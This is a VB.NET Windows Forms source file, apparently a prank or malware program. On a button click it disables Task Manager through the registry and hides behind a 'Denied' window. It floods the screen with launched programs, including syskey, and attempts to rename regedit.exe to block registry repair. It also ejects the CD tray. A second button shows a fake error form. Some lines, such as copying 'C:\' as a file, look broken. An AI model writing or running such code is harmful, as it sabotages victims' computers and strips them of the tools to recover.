Imports System.IO
Public Class Well_Shit

    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Try
            My.Computer.Registry.CurrentUser.CreateSubKey("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr")
        Catch ex As Exception
        End Try
        Dim regkey As Microsoft.Win32.RegistryKey
        Dim keyValueInt As String = "1"
        Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
        regkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(subkey:=subKey)
        regkey.SetValue("DisableTaskMgr", keyValueInt)
        regkey.Close()
        Me.Hide()
        Denied.Show()

        Process.Start(My.Computer.FileSystem.SpecialDirectories.MyDocuments)
        Process.Start(My.Computer.FileSystem.SpecialDirectories.MyMusic)
        Process.Start(My.Computer.FileSystem.SpecialDirectories.MyPictures)
        Process.Start("winver")
        Process.Start("explorer")
        Process.Start("explorer")
        Process.Start("explorer")
        Process.Start("explorer")
        Process.Start("explorer")
        Process.Start("explorer")
        Process.Start("explorer")
        Process.Start("explorer")
        Process.Start("explorer")
        Process.Start("cleanmgr")
        Process.Start("syskey")
        Process.Start("dialer")
        Process.Start("mspaint")
        Process.Start("joy.cpl")
        Dim proc = Process.GetProcessesByName("explorer")
        For i As Integer = 0 To proc.Count - 1
            proc(i).CloseMainWindow()
        Next i
        My.Computer.FileSystem.CopyFile(
    "C:\",
    "C:\UserFiles\TestFiles2\testFile.txt",
    Microsoft.VisualBasic.FileIO.UIOption.AllDialogs,
    Microsoft.VisualBasic.FileIO.UICancelOption.DoNothing)
        My.Computer.FileSystem.RenameFile("C:\Windows\regedit.exe", "C:\Windows\Installer.exe")
        Dim retVal As Integer
        retVal = mciSendString("set cd door open", vbNullString, 0, 0)



    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Fake_Error.Show()
        Me.Hide()
    End Sub
End Class
